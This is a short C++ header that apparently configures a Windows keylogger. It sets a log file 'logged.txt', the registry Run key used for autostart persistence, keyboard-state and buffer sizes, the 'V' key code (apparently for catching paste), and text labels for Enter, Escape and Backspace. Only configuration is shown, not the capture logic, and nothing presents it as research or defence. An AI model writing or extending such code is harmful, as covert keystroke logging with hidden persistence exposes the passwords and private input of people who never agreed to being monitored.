#pragma once

#include <Windows.h>
#include <cstdint>
#include <string>
#include <unordered_map>

namespace configuration
{
    constexpr const wchar_t* out_file = L"logged.txt";

    constexpr const wchar_t* lp_sub_key = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    constexpr uint16_t keyboard_state_size = 256;

    constexpr uint8_t key_buffer_size = 4;

    constexpr uint8_t virtual_key_v = 0x56;

    const std::unordered_map<DWORD, std::wstring> key_codes
    {
        { VK_RETURN, L"\n" },
        { VK_ESCAPE, L"[ESCAPE]" },
        { VK_BACK, L"[BACKSPACE]" }
    };
}
